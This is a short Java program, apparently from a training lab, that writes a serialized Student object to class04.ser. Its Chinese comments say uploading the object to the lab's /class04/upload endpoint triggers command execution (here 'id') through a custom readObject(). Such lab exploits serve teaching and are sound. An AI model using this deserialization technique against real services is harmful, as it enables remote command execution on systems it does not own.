import com.ctfstu.class04.Student;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

/**
 * 生成 class04 的 payload — 自定义 readObject → 命令执行
 * 目标: 上传 com.ctfstu.class04.Student 对象
 *       反序列化时自动触发 readObject() 执行命令
 * 靶场: /class04/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Student student = new Student("id", 18);

        ObjectOutputStream oos = new ObjectOutputStream(
            new FileOutputStream("class04.ser"));
        oos.writeObject(student);
        oos.close();

        System.out.println("✅ 已生成: class04.ser");
    }
}
